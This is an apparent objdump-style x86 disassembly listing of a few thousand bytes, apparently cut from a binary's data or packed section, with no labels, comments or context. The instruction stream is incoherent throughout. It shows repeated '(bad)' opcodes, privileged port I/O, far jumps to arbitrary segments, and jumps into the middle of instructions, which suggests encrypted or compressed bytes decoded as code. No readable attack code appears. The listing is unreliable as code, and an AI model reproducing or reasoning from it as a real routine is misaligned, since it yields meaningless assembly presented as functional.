  417d2a:	push   ds
  417d2b:	div    BYTE PTR [eax+0x1a]
  417d2e:	std    
  417d2f:	loope  0x417d69
  417d31:	xor    BYTE PTR [edx-0xf],bl
  417d34:	sub    al,0xe1
  417d36:	leave  
  417d37:	inc    ebp
  417d38:	test   DWORD PTR [esi-0x78],ebp
  417d3b:	xlat   BYTE PTR ds:[ebx]
  417d3c:	mov    al,ds:0x1ddd9afe
  417d41:	(bad)  
  417d42:	fiadd  DWORD PTR [eax]
  417d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d45:	add    esi,DWORD PTR [edi]
  417d47:	cmp    al,BYTE PTR [esi-0x3df8ecaa]
  417d4d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  417d4f:	pop    es
  417d50:	dec    ebx
  417d51:	sbb    esp,edx
  417d53:	cmp    dh,BYTE PTR ds:0xfc2aced0
  417d59:	push   0x38
  417d5b:	or     DWORD PTR [ebx+0x1b],0x3c67b8bd
  417d62:	mov    edi,0xa5f437
  417d67:	and    al,0xed
  417d69:	jle    0x417d69
  417d6b:	push   ebp
  417d6c:	mov    bh,0x7e
  417d6e:	add    ah,BYTE PTR [ebx-0x47]
  417d71:	dec    esi
  417d72:	jae    0x417d3a
  417d74:	repz push ecx
  417d76:	cmp    BYTE PTR [esi+0x6c],ah
  417d79:	fsubr  QWORD PTR [edi-0x1a]
  417d7c:	push   eax
  417d7d:	xor    esi,eax
  417d7f:	jno    0x417dd2
  417d81:	fsubr  QWORD PTR [edi+0x6f]
  417d84:	imul   ecx,DWORD PTR [ebx-0x27],0xf57d5251
  417d8b:	xor    bh,BYTE PTR [eax+ebp*4-0x5ab65b83]
  417d92:	(bad)  
  417d93:	loope  0x417e0b
  417d95:	mov    ds:0x33ff1726,al
  417d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d9b:	adc    ebp,edx
  417d9d:	pop    ebx
  417d9e:	or     eax,0xa6a5bd45
  417da3:	popa   
  417da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417da5:	dec    edi
  417da6:	mov    ds:0x1c1d5b0d,eax
  417dab:	inc    edi
  417dac:	(bad)  
  417dad:	pop    edi
  417dae:	in     eax,0xeb
  417db0:	or     BYTE PTR [eax+0x422f0d5c],dl
  417db6:	retf   
  417db7:	adc    ecx,esi
  417db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dba:	inc    esp
  417dbb:	or     esi,DWORD PTR [edi+eiz*4-0x413d9b54]
  417dc2:	sbb    edx,DWORD PTR [edi-0x7d]
  417dc5:	jl     0x417d84
  417dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dc8:	or     dh,ah
  417dca:	bound  esi,QWORD PTR [esi]
  417dcc:	mov    bl,0x1
  417dce:	ins    DWORD PTR es:[edi],dx
  417dcf:	int    0x27
  417dd1:	jecxz  0x417df7
  417dd3:	inc    edi
  417dd4:	sub    cl,ah
  417dd6:	stc    
  417dd7:	fcmovne st,st(0)
  417dd9:	sbb    esp,DWORD PTR [ebp+0x22]
  417ddc:	add    DWORD PTR [edx],eax
  417dde:	push   0x48346e75
  417de3:	sub    al,0x41
  417de5:	sbb    DWORD PTR ds:0x7496a480,ecx
  417deb:	fwait
  417dec:	xor    eax,ebx
  417dee:	sub    DWORD PTR [ecx+0x21560e2e],edi
  417df4:	sbb    eax,DWORD PTR [esi-0x5]
  417df7:	xor    BYTE PTR [eax+0x2e],cl
  417dfa:	jnp    0x417e5b
  417dfc:	(bad)  
  417dfd:	pop    eax
  417dfe:	(bad)  
  417dff:	dec    ecx
  417e00:	mov    edx,0x9ad88432
  417e05:	call   FWORD PTR [edi]
  417e07:	mov    bh,0x8d
  417e09:	jmp    0xf7d9aa87
  417e0e:	push   cs
  417e0f:	aad    0xe9
  417e11:	jae    0x417e69
  417e13:	cmp    edi,DWORD PTR [ebx+0x755fad3e]
  417e19:	stos   BYTE PTR es:[edi],al
  417e1a:	jge    0x417dfd
  417e1c:	mov    al,ss:0xe20f6f29
  417e22:	gs std 
  417e24:	dec    edi
  417e25:	mov    DWORD PTR [ebp+0x45294e55],ebx
  417e2b:	inc    ecx
  417e2c:	cmp    eax,0xfadec8f7
  417e31:	inc    edx
  417e32:	push   esi
  417e33:	jg     0x417e54
  417e35:	out    0x47,eax
  417e37:	and    DWORD PTR [edx-0x16],0xb38c2723
  417e3e:	jecxz  0x417e11
  417e40:	frstpm(287 only) 
  417e42:	jmp    0xaa2a:0x95778118
  417e49:	mov    ch,0x91
  417e4b:	pop    edx
  417e4c:	xchg   edi,eax
  417e4d:	in     eax,0x52
  417e4f:	pop    ecx
  417e50:	inc    ecx
  417e51:	iret   
  417e52:	jnp    0x417e0e
  417e54:	(bad)  
  417e56:	hlt    
  417e57:	out    dx,eax
  417e58:	and    eax,0xf425f73e
  417e5d:	mov    ah,0x26
  417e5f:	xchg   dl,bh
  417e61:	mov    ebx,0xc8daef41
  417e66:	(bad)  
  417e67:	mov    edx,0x42c8f78a
  417e6c:	lock mov DWORD PTR [ebp+0x367544a7],ecx
  417e73:	add    DWORD PTR [ebx-0x5d221bb],0x4937ff98
  417e7d:	push   es
  417e7e:	ss add al,0x14
  417e81:	nop
  417e82:	pop    edx
  417e83:	mov    ah,0x2a
  417e85:	add    DWORD PTR [edx],edx
  417e87:	xchg   edi,eax
  417e88:	sub    DWORD PTR [ecx-0x7cee471a],edx
  417e8e:	dec    eax
  417e8f:	dec    ecx
  417e90:	sti    
  417e91:	mov    bh,0x7a
  417e93:	mov    al,ds:0x528db783
  417e98:	repnz cmp al,0xa3
  417e9b:	dec    ecx
  417e9c:	loop   0x417efc
  417e9e:	sub    DWORD PTR [ecx],ecx
  417ea0:	push   esp
  417ea1:	aad    0x3c
  417ea3:	sbb    eax,0x8e63c80c
  417ea8:	xor    eax,0xf0554df5
  417ead:	stos   DWORD PTR es:[edi],eax
  417eae:	push   ss
  417eaf:	push   0x4bc9b90a
  417eb4:	or     al,0xa5
  417eb6:	push   esi
  417eb7:	dec    ebx
  417eb8:	loope  0x417e86
  417eba:	xchg   edx,eax
  417ebb:	adc    al,0x72
  417ebd:	popa   
  417ebe:	ss es jne 0x417f1d
  417ec2:	push   0xd7e1cb40
  417ec7:	jp     0x417eaf
  417ec9:	neg    BYTE PTR [ecx]
  417ecb:	jmp    0x594bbbc
  417ed0:	inc    eax
  417ed2:	jbe    0x417f1d
  417ed4:	popa   
  417ed5:	nop
  417ed6:	daa    
  417ed7:	sbb    eax,0xa6b5d3e6
  417edc:	popf   
  417edd:	repnz xor DWORD PTR [ebp-0x116d81f2],esi
  417ee4:	jbe    0x417ee7
  417ee6:	xchg   BYTE PTR [ebx+0x66c03250],ah
  417eec:	adc    bh,al
  417eee:	mov    al,0xfa
  417ef0:	push   esi
  417ef1:	push   ds
  417ef2:	shr    DWORD PTR [edi+0x22ea990b],1
  417ef8:	out    0xfb,al
  417efa:	je     0x417f55
  417efc:	xor    eax,0x6342a1e
  417f01:	popa   
  417f02:	out    dx,eax
  417f03:	ret    
  417f04:	push   edx
  417f05:	or     BYTE PTR [edx-0x57],0x64
  417f09:	call   0xb108:0x24752f1a
  417f10:	imul   esp,DWORD PTR [ecx+0x54],0x394740dc
  417f17:	(bad)  
  417f18:	int    0xd6
  417f1a:	out    0xbd,eax
  417f1c:	jbe    0x417f0b
  417f1e:	enter  0x3f2c,0xa3
  417f22:	mov    ch,0x6f
  417f24:	mov    al,BYTE PTR [ebx]
  417f26:	cwde   
  417f27:	xor    DWORD PTR [edi+0x4b331390],0xff21f14b
  417f31:	fcompp 
  417f33:	xchg   DWORD PTR [esi],ebp
  417f35:	repz ret 
  417f37:	out    0x65,al
  417f39:	cli    
  417f3a:	not    BYTE PTR [edx-0x5f]
  417f3d:	fistp  DWORD PTR [edi+0x24]
  417f40:	jle    0x417f48
  417f42:	mov    ds:0xbfaca930,al
  417f47:	(bad)  
  417f48:	and    DWORD PTR [ecx+0xf],esp
  417f4b:	test   eax,0xfee63e92
  417f50:	outs   dx,DWORD PTR ds:[esi]
  417f51:	cs out 0x29,eax
  417f54:	xor    al,0xdd
  417f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f57:	call   0x8368613d
  417f5c:	push   dx
  417f5e:	daa    
  417f5f:	int    0xec
  417f61:	xchg   ecx,eax
  417f62:	les    edi,FWORD PTR [esi-0x243ee0e7]
  417f68:	pusha  
  417f69:	xchg   ebx,esi
  417f6b:	stc    
  417f6c:	dec    edi
  417f6d:	sti    
  417f6e:	and    ecx,esp
  417f70:	out    0xda,al
  417f72:	or     esi,DWORD PTR [edx]
  417f74:	outs   dx,BYTE PTR ds:[esi]
  417f75:	mov    esp,0x88d2b580
  417f7a:	daa    
  417f7b:	xchg   BYTE PTR [esi+0x4e05d29d],dl
  417f81:	aas    
  417f82:	call   0x1f8728a0
  417f87:	call   0x7f600a00
  417f8c:	push   ebp
  417f8d:	inc    DWORD PTR [esi]
  417f8f:	cwde   
  417f90:	jno    0x417fb9
  417f92:	add    edi,DWORD PTR [ecx-0x4e28b315]
  417f98:	mov    bl,0xd6
  417f9a:	adc    bh,BYTE PTR [edi]
  417f9c:	ins    BYTE PTR es:[edi],dx
  417f9d:	cmp    dh,BYTE PTR [edi+0x4a]
  417fa0:	out    dx,eax
  417fa1:	mov    ch,0x2d
  417fa3:	les    edi,FWORD PTR [esi]
  417fa5:	xor    ah,BYTE PTR [ebx]
  417fa7:	mov    eax,ds:0x1ab8d81c
  417fac:	bound  ebp,QWORD PTR [eax]
  417fae:	int3   
  417faf:	xchg   edi,eax
  417fb0:	mov    esp,0x807012a4
  417fb5:	fadd   st,st(6)
  417fb7:	add    eax,0x8b1962da
  417fbc:	cmp    eax,0x82eb37e2
  417fc1:	sti    
  417fc2:	jg     0x417f7b
  417fc4:	xor    DWORD PTR [esi+0x6fa9c275],eax
  417fca:	inc    eax
  417fcb:	dec    esi
  417fcc:	xlat   BYTE PTR ds:[ebx]
  417fcd:	pop    esi
  417fce:	pop    ebp
  417fcf:	mov    ch,0xdf
  417fd1:	or     DWORD PTR [ebx+esi*2+0xc],edi
  417fd5:	jne    0x417f66
  417fd7:	and    ecx,DWORD PTR [eax+0x2255859a]
  417fdd:	es push 0x8ce2c92f
  417fe3:	dec    ecx
  417fe4:	lock add ah,bl
  417fe7:	sbb    bh,al
  417fe9:	int3   
  417fea:	jmp    0x417f9d
  417fec:	add    al,0x1f
  417fee:	popf   
  417fef:	dec    ecx
  417ff0:	sti    
  417ff1:	aas    
  417ff2:	jmp    0xbbdaedbd
  417ff7:	and    esp,DWORD PTR [edx+0x24]
  417ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffb:	pop    ebx
  417ffc:	dec    edi
  417ffd:	xchg   edi,eax
  417ffe:	cmp    ecx,DWORD PTR [ecx-0x58]
  418001:	jns    0x417fe9
  418003:	dec    ecx
  418004:	ins    BYTE PTR es:[edi],dx
  418005:	add    eax,0x62de1763
  41800a:	xchg   ecx,eax
  41800b:	cld    
  41800c:	sub    bh,ch
  41800e:	ret    
  41800f:	sbb    BYTE PTR ds:0xc0af7492,al
  418015:	dec    esi
  418016:	mov    bl,BYTE PTR [ebp-0x23ea6cf1]
  41801c:	inc    ebx
  41801d:	retf   0x9e2d
  418020:	out    dx,eax
  418021:	pop    ds
  418022:	push   eax
  418023:	outs   dx,DWORD PTR ds:[esi]
  418024:	pusha  
  418025:	in     al,dx
  418026:	mov    ds:0x88178f31,al
  41802b:	(bad)  [eax]
  41802d:	cdq    
  41802e:	sub    al,0x17
  418030:	mov    bh,0x40
  418032:	xchg   esp,eax
  418033:	rcr    BYTE PTR [edx+0x5b7170a3],cl
  418039:	pop    ss
  41803a:	stc    
  41803b:	sub    DWORD PTR [ecx+0x7],edx
  41803e:	and    bl,dl
  418040:	gs ins BYTE PTR es:[edi],dx
  418042:	add    bl,bl
  418044:	retf   
  418045:	jl     0x4180c0
  418047:	dec    esi
  418048:	outs   dx,DWORD PTR ds:[esi]
  418049:	loopne 0x41808e
  41804b:	adc    eax,ebx
  41804d:	pop    edx
  41804e:	xor    DWORD PTR [ecx+0x677156ec],ebx
  418054:	mov    ah,0x20
  418056:	enter  0x9e8b,0xb6
  41805a:	pusha  
  41805b:	push   edi
  41805c:	mov    ds,ecx
  41805e:	jl     0x4180b2
  418060:	lock cmp al,0x9a
  418063:	adc    BYTE PTR [edx-0x65],dh
  418066:	(bad)  
  418067:	std    
  418068:	and    BYTE PTR [eax],ah
  41806a:	mov    ah,0x4
  41806c:	add    ah,dl
  41806e:	retf   0xb363
  418071:	push   DWORD PTR [edi]
  418073:	add    al,0x17
  418075:	(bad)  
  418076:	adc    DWORD PTR [ebx],edi
  418078:	jp     0x418082
  41807a:	fnstcw WORD PTR [ecx-0x663378b6]
  418080:	xchg   ebp,eax
  418081:	lahf   
  418082:	and    BYTE PTR [edi+0x7bcb5836],dl
  418088:	aas    
  418089:	adc    DWORD PTR [ebp-0xf52e3ba],edx
  41808f:	mov    ecx,0x2bc23434
  418094:	(bad)  [edi+0x6b02996]
  41809a:	push   edi
  41809b:	arpl   si,si
  41809d:	or     al,0xb4
  41809f:	sti    
  4180a0:	(bad)  
  4180a1:	xchg   edi,eax
  4180a2:	sub    cl,BYTE PTR [esp]
  4180a5:	imul   ebp,DWORD PTR [ecx+0x78],0xb57f924a
  4180ac:	pop    ecx
  4180ad:	inc    ebp
  4180ae:	call   0xd6a7:0x72ecdbc2
  4180b5:	xchg   esi,eax
  4180b6:	xor    bh,ch
  4180b8:	inc    ebp
  4180b9:	cmp    ah,ch
  4180bb:	or     al,0x91
  4180bd:	cmp    bl,BYTE PTR [ecx+0x3b]
  4180c0:	jmp    0xaf2e:0xcae24504
  4180c7:	or     al,0xd0
  4180c9:	mov    BYTE PTR [eax],al
  4180cb:	clc    
  4180cc:	cwde   
  4180cd:	test   BYTE PTR [esi-0xd07d38f],al
  4180d3:	jmp    0x41814e
  4180d5:	mov    ebp,0x323b64ba
  4180da:	xlat   BYTE PTR ds:[ebx]
  4180db:	push   0x3e1717dd
  4180e0:	fwait
  4180e1:	scas   al,BYTE PTR es:[edi]
  4180e2:	or     eax,0x80b4eb7d
  4180e7:	and    DWORD PTR [eax+0x71],esp
  4180ea:	mov    ds:0x11b4fe56,al
  4180ef:	enter  0x6633,0xf7
  4180f3:	daa    
  4180f4:	fidivr DWORD PTR [edi+0x5ab83be4]
  4180fa:	rcl    DWORD PTR [eax],cl
  4180fc:	and    BYTE PTR [eax],bl
  4180fe:	xchg   ecx,eax
  4180ff:	out    dx,al
  418100:	xchg   ebx,eax
  418101:	pop    eax
  418102:	pushw  ds
  418104:	push   cs
  418105:	emms   
  418107:	inc    edx
  418108:	mov    eax,ds:0xc1abd615
  41810d:	call   esi
  41810f:	call   0x880a3c30
  418114:	or     bl,BYTE PTR [edx-0x53]
  418117:	in     al,dx
  418118:	popa   
  418119:	sbb    eax,0xb01eced6
  41811e:	arpl   WORD PTR [ebp+0x1891dabd],dx
  418124:	data16 je 0x418169
  418127:	shr    DWORD PTR [edx],1
  418129:	adc    BYTE PTR [eax-0x42c04eaf],bh
  41812f:	cmp    ebx,DWORD PTR [edx-0x5c]
  418132:	dec    edx
  418133:	or     al,0xcb
  418135:	loop   0x418129
  418137:	addr16 clc 
  418139:	scas   eax,DWORD PTR es:[edi]
  41813a:	test   DWORD PTR [ebx-0x7e],ecx
  41813d:	and    cl,dh
  41813f:	fwait
  418140:	loopne 0x4181bc
  418142:	gs xchg ebx,eax
  418144:	ins    BYTE PTR es:[edi],dx
  418145:	or     DWORD PTR [ebx-0x73],edi
  418148:	xor    ch,BYTE PTR [edi]
  41814a:	or     esp,DWORD PTR [esi]
  41814c:	jg     0x41816f
  41814e:	push   cs
  41814f:	xchg   edi,eax
  418150:	mov    ebp,0x5faa6f06
  418155:	xor    dl,dl
  418157:	shr    BYTE PTR [ebp+0x39],cl
  41815a:	je     0x4180f7
  41815c:	retf   
  41815d:	out    0x41,eax
  41815f:	bnd jb 0x418162
  418162:	lods   eax,DWORD PTR ds:[esi]
  418163:	push   es
  418164:	inc    ebx
  418165:	sub    BYTE PTR [edi+0xcab3267],0x87
  41816c:	sbb    eax,0xcdbe77b1
  418171:	test   eax,0xfd1234d4
  418176:	cmp    ebp,eax
  418178:	mov    al,ds:0x1b9fa3db
  41817d:	or     al,0x34
  41817f:	ret    
  418180:	mov    BYTE PTR [ecx-0x14830d9e],bl
  418186:	xor    ecx,ebp
  418188:	nop
  418189:	pop    eax
  41818a:	mov    fs,WORD PTR [edi]
  41818c:	cmp    al,0xe2
  41818e:	push   edi
  41818f:	xor    BYTE PTR [eax],dl
  418191:	mov    es,WORD PTR [esi-0x31]
  418194:	sar    BYTE PTR [edi+0xbb9acbd],1
  41819a:	and    ah,BYTE PTR [esi+0x222ae469]
  4181a0:	inc    edi
  4181a1:	pop    eax
  4181a2:	ror    DWORD PTR ds:0xb330e0ea,cl
  4181a8:	pop    ss
  4181a9:	retf   0x3ec
  4181ac:	push   0x70461fbb
  4181b1:	aam    0xf9
  4181b3:	cmp    ebp,eax
  4181b5:	(bad)  
  4181b6:	cmc    
  4181b7:	js     0x418228
  4181b9:	in     eax,0x15
  4181bb:	in     al,0x27
  4181bd:	lods   eax,DWORD PTR ds:[esi]
  4181be:	lock inc ebp
  4181c0:	test   DWORD PTR [ebx+0x75b3ef9c],0xb7bbab17
  4181ca:	sar    BYTE PTR [ebp-0x62e5f4c4],1
  4181d0:	stos   BYTE PTR es:[edi],al
  4181d1:	adc    eax,0x6e0cfe4
  4181d6:	jge    0x418214
  4181d8:	jge    0x4181d9
  4181da:	mov    edi,0xbd68e335
  4181df:	mov    edx,0x2903d3da
  4181e4:	enter  0x933d,0xd1
  4181e8:	add    eax,0x6c21d753
  4181ed:	int3   
  4181ee:	cmp    bh,al
  4181f0:	popa   
  4181f1:	ret    
  4181f2:	sbb    eax,0x579e05d5
  4181f7:	aas    
  4181f8:	loope  0x41825e
  4181fa:	hlt    
  4181fb:	(bad)  
  4181fd:	retf   0xd15e
  418200:	jp     0x418217
  418202:	pop    ebp
  418203:	les    esp,FWORD PTR [edx]
  418205:	(bad)  
  418206:	mov    edx,0x1e74b704
  41820b:	pop    edi
  41820c:	mov    DWORD PTR [esi],ecx
  41820e:	test   eax,0xd002c039
  418213:	outs   dx,BYTE PTR ds:[esi]
  418214:	cmp    eax,ecx
  418216:	pop    esi
  418217:	lock jecxz 0x41823f
  41821a:	loop   0x4181e5
  41821c:	test   eax,0x199aca6d
  418221:	xchg   DWORD PTR [eax],ecx
  418223:	ret    
  418224:	mov    al,0x2d
  418226:	mov    ss,esp
  418228:	retf   0xf78d
  41822b:	nop
  41822c:	xchg   esi,eax
  41822d:	hlt    
  41822e:	bound  ebx,QWORD PTR [ebx-0x5d8a277d]
  418234:	pop    esi
  418235:	mov    ebp,DWORD PTR [esi+edx*8-0x1d]
  418239:	out    0x7,al
  41823b:	in     al,dx
  41823c:	cmp    eax,0xbce4ed55
  418241:	sub    eax,0xab6af939
  418246:	int    0xba
  418248:	adc    DWORD PTR [edi-0x4457bc50],0x31fcd569
  418252:	sub    eax,0x3de8e800
  418257:	sahf   
  418258:	mov    edi,DWORD PTR [esi]
  41825a:	(bad)  
  41825b:	pop    edi
  41825c:	pop    eax
  41825d:	arpl   bx,si
  41825f:	fisttp QWORD PTR [ecx]
  418261:	and    esi,edi
  418263:	cmp    BYTE PTR [ecx+0x3db5c012],ah
  418269:	jp     0x4182b7
  41826b:	inc    edx
  41826c:	jle    0x41824e
  41826e:	sub    BYTE PTR [ebx],bl
  418270:	xchg   esi,eax
  418271:	minps  xmm5,XMMWORD PTR [ecx]
  418274:	or     bl,BYTE PTR [edi-0x44]
  418277:	pop    ecx
  418278:	mov    ebp,0x95583b4f
  41827d:	push   eax
  41827e:	pop    ebx
  41827f:	inc    edx
  418280:	push   edx
  418281:	int3   
  418282:	xchg   edi,eax
  418283:	into   
  418284:	test   eax,0x95ee63e
  418289:	jecxz  0x4182a4
  41828b:	dec    esi
  41828c:	jge    0x418260
  41828e:	aas    
  41828f:	test   DWORD PTR [ebp+0x2c],ecx
  418292:	add    dl,BYTE PTR [edi]
  418294:	daa    
  418295:	ins    DWORD PTR es:[edi],dx
  418296:	xchg   DWORD PTR [esi-0x7a02e067],ebx
  41829c:	call   0x595183a
  4182a1:	xchg   ebx,eax
  4182a2:	pusha  
  4182a3:	add    al,BYTE PTR ds:0xf0a62901
  4182a9:	ins    BYTE PTR es:[edi],dx
  4182aa:	or     DWORD PTR [ecx],ebx
  4182ac:	fnstsw WORD PTR [ebx+0x2b1ae446]
  4182b2:	mov    bh,0xf8
  4182b4:	mov    bh,0x8e
  4182b6:	fist   DWORD PTR [ecx-0x47]
  4182b9:	xor    esp,edi
  4182bb:	(bad)  
  4182bc:	in     al,dx
  4182bd:	pmulhw mm0,mm0
  4182c0:	adc    DWORD PTR [ecx-0x5753dc8f],edx
  4182c6:	dec    ecx
  4182c7:	sbb    DWORD PTR [edi+0x6fdb6e63],ebp
  4182cd:	or     al,0x10
  4182cf:	push   ss
  4182d0:	xchg   esp,eax
  4182d1:	jo     0x4182b8
  4182d3:	mov    bl,0xc
  4182d5:	test   eax,0x8613c96a
  4182da:	sbb    eax,0xc87de749
  4182df:	rol    eax,cl
  4182e1:	imul   ecx,DWORD PTR [eax+0x18fa0169],0xffffffb1
  4182e8:	(bad)  
  4182e9:	push   DWORD PTR [eax]
  4182eb:	cwde   
  4182ec:	pop    ecx
  4182ed:	mov    esi,0x2698ac4f
  4182f2:	and    BYTE PTR [edx],ah
  4182f4:	jnp    0x41830c
  4182f6:	sar    DWORD PTR [ebx+0x16],0xd1
  4182fa:	fidiv  WORD PTR [eax+0x10360eb1]
  418300:	xchg   edx,eax
  418301:	lea    edi,[ebx-0x49]
  418304:	mov    edx,0x912e6919
  418309:	cli    
  41830a:	adc    DWORD PTR [esi-0x46],edx
  41830d:	mov    WORD PTR [ebp+0x712d5a01],gs
  418313:	push   DWORD PTR [ebp+eax*2+0x1fb20ad2]
  41831a:	adc    DWORD PTR [eax-0x2e0608f5],0x22
  418321:	fisttp QWORD PTR [eax]
  418323:	dec    ecx
  418324:	or     dh,ch
  418326:	push   ss
  418327:	cmp    esp,DWORD PTR [edx-0x10]
  41832a:	ror    bh,1
  41832c:	sub    eax,0xf79193c5
  418331:	cmp    al,0x50
  418333:	std    
  418334:	dec    esi
  418335:	adc    cl,ch
  418337:	aad    0xf1
  418339:	pop    es
  41833a:	sbb    edx,ecx
  41833c:	(bad)  [edx-0x51]
  41833f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418340:	pop    ecx
  418341:	push   ds
  418342:	out    0x6d,eax
  418344:	imul   BYTE PTR [esp]
  418347:	jmp    0x5f331a25
  41834c:	aam    0xea
  41834e:	ficomp DWORD PTR [edi-0x2aea4cb]
  418354:	data16 shr ch,cl
  418357:	mov    eax,0xada17312
  41835c:	sar    BYTE PTR [esi+0x10],cl
  41835f:	leave  
  418360:	(bad)  
  418361:	iret   
  418362:	stos   DWORD PTR es:[edi],eax
  418363:	jb     0x4182ec
  418365:	rcl    edi,1
  418367:	push   0xe519dfb2
  41836c:	xlat   BYTE PTR ds:[ebx]
  41836d:	mov    ebp,0xf2da796f
  418372:	xchg   edx,eax
  418373:	imul   esi,ecx,0xb737b9c4
  418379:	out    dx,eax
  41837a:	jmp    0x41839f
  41837c:	sbb    esi,DWORD PTR [ecx]
  41837e:	fwait
  41837f:	(bad)
  418382:	inc    ebx
  418383:	std    
  418384:	pusha  
  418385:	(bad)  
  418386:	imul   esp
  418388:	pushf  
  418389:	ja     0x4183bb
  41838b:	enter  0x33a9,0x12
  41838f:	call   0xfa09:0xa2ef694b
  418396:	imul   ebx,DWORD PTR ds:[ebp+0x5d],0x43
  41839b:	pop    eax
  41839c:	mov    bh,0xf8
  41839e:	mov    WORD PTR [ecx],cs
  4183a0:	mov    eax,0xb7fe8f91
  4183a5:	jno    0x41839c
  4183a7:	pop    edi
  4183a8:	outs   dx,BYTE PTR ds:[esi]
  4183a9:	add    BYTE PTR [eax+0xbb9b1a3],ch
  4183af:	jbe    0x418371
  4183b1:	and    BYTE PTR [ebp+0x34be7dd9],0x99
  4183b8:	or     BYTE PTR [edx+ebp*1-0x1],0x6c
  4183bd:	sub    al,0xa4
  4183bf:	lods   al,BYTE PTR ds:[esi]
  4183c0:	pusha  
  4183c1:	cmc    
  4183c2:	imul   ecx,DWORD PTR [eax-0x4e],0x1d30aa8b
  4183c9:	imul   edi,DWORD PTR [esi+0x1a],0xffffffbd
  4183cd:	aaa    
  4183ce:	clc    
  4183cf:	cld    
  4183d0:	retf   
  4183d1:	and    DWORD PTR [ecx-0x6c],edx
  4183d4:	sti    
  4183d5:	add    esp,esi
  4183d7:	cwde   
  4183d8:	rcl    DWORD PTR [edi-0x7f],1
  4183db:	cmp    esp,DWORD PTR fs:[edx-0x34b355ef]
  4183e2:	cmp    BYTE PTR [ecx+0xb955a1a],bh
  4183e8:	loopne 0x4183ff
  4183ea:	mov    WORD PTR [ebx-0x1f],?
  4183ed:	mov    ecx,0xb9b01567
  4183f2:	(bad)  
  4183f3:	mov    bl,0xf9
  4183f5:	aas    
  4183f6:	icebp  
  4183f7:	mov    edi,0xd6016089
  4183fc:	lods   al,BYTE PTR ds:[esi]
  4183fd:	jp     0x41845c
  4183ff:	and    al,0x40
  418401:	pop    edx
  418402:	lahf   
  418403:	cwde   
  418404:	or     al,0x75
  418406:	add    eax,0x354fd0f6
  41840b:	rcl    DWORD PTR [ecx],cl
  41840d:	adc    eax,0x59112f52
  418412:	jg     0x418479
  418414:	cmp    DWORD PTR [edx+ecx*8],edx
  418417:	fbstp  TBYTE PTR [edi-0x16]
  41841a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41841b:	jmp    0x6773:0x4e6f8c0
  418422:	stos   BYTE PTR es:[edi],al
  418423:	xchg   edx,eax
  418424:	daa    
  418425:	dec    ebp
  418426:	ds push ebp
  418428:	fld    QWORD PTR [ebx+0x1c7bf902]
  41842e:	fs lahf 
  418430:	aaa    
  418431:	sbb    eax,DWORD PTR [ebx]
  418433:	or     al,bl
  418435:	cmp    eax,0xb911f3e7
  41843a:	mov    BYTE PTR [eax],0x71
  41843d:	(bad)  
  41843e:	xlat   BYTE PTR ds:[ebx]
  41843f:	mov    BYTE PTR [edx],bl
  418441:	cmp    ax,0xbe14
  418445:	not    BYTE PTR [eax]
  418447:	lods   eax,DWORD PTR ds:[esi]
  418448:	popa   
  418449:	pop    ebp
  41844a:	pusha  
  41844b:	jl     0x4183f7
  41844d:	popf   
  41844e:	adc    ah,BYTE PTR [ecx]
  418450:	cdq    
  418451:	test   eax,0xda504a96
  418456:	xchg   ecx,eax
  418457:	and    edx,edi
  418459:	lea    edx,[ecx]
  41845b:	xor    ah,BYTE PTR [edx-0x3a]
  41845e:	pop    ebx
  41845f:	mov    esp,0xa31e11f0
  418464:	neg    ch
  418466:	addr16 addr16 mov edi,0x5212c341
  41846d:	xor    bl,dl
  41846f:	test   dl,al
  418471:	push   edx
  418472:	mov    ebp,0xf1db29f4
  418477:	lods   al,BYTE PTR ds:[esi]
  418478:	pop    edi
  418479:	adc    BYTE PTR [esi+0x629c53c9],dl
  41847f:	in     al,dx
  418480:	das    
  418481:	shr    DWORD PTR [edi-0x11],cl
  418484:	mov    ds:0x2a65bdaa,eax
  418489:	stc    
  41848a:	push   ebp
  41848b:	js     0x4184db
  41848d:	jl     0x4184ef
  41848f:	add    al,0xad
  418491:	mov    ds:0x491bb5ac,eax
  418496:	je     0x418463
  418498:	enter  0x8a6f,0x2d
  41849c:	clc    
  41849d:	push   edi
  41849e:	xchg   edx,eax
  41849f:	inc    ebx
  4184a0:	and    BYTE PTR [ebp+0x124e42e3],cl
  4184a6:	in     eax,0xa0
  4184a8:	das    
  4184a9:	jb     0x41848f
  4184ab:	into   
  4184ac:	cli    
  4184ad:	stos   BYTE PTR es:[edi],al
  4184ae:	pop    ebx
  4184af:	sahf   
  4184b0:	rcl    DWORD PTR [esi+0x43],1
  4184b3:	push   ebp
  4184b4:	dec    ebx
  4184b5:	add    ecx,ebx
  4184b7:	pop    esi
  4184b8:	ss jecxz 0x418448
  4184bb:	bound  edx,QWORD PTR [eax+0x7]
  4184be:	rol    ebp,1
  4184c0:	push   ebx
  4184c1:	(bad)
  4184c5:	cdq    
  4184c6:	rcl    DWORD PTR [edx-0x5b],1
  4184c9:	and    ch,BYTE PTR [edi-0x2f]
  4184cc:	shr    BYTE PTR [ebx-0x21],0x64
  4184d0:	not    DWORD PTR [ebx-0x1a950619]
  4184d6:	ins    BYTE PTR es:[edi],dx
  4184d7:	sub    al,0xa1
  4184d9:	add    bh,BYTE PTR [edi+ecx*1+0x6e]
  4184dd:	sub    dl,BYTE PTR [ebp+ebx*2+0x1]
  4184e1:	xchg   ebx,eax
  4184e2:	dec    eax
  4184e3:	sbb    DWORD PTR [esi+0x9da226a],ecx
  4184e9:	cmp    al,0x54
  4184eb:	les    edi,FWORD PTR [eax]
  4184ed:	je     0x4184bb
  4184ef:	cs mov ebx,0xd7227465
  4184f6:	loope  0x41852e
  4184f8:	ins    DWORD PTR es:[edi],dx
  4184f9:	stc    
  4184fa:	or     dl,BYTE PTR [esi+0x53]
  4184fd:	and    al,0x17
  4184ff:	ins    DWORD PTR es:[edi],dx
  418500:	out    dx,eax
  418501:	in     eax,0x7a
  418503:	push   eax
  418504:	mul    BYTE PTR [ecx+0x2d]
  418507:	pop    es
  418508:	fild   WORD PTR [edi+edi*4+0x6d]
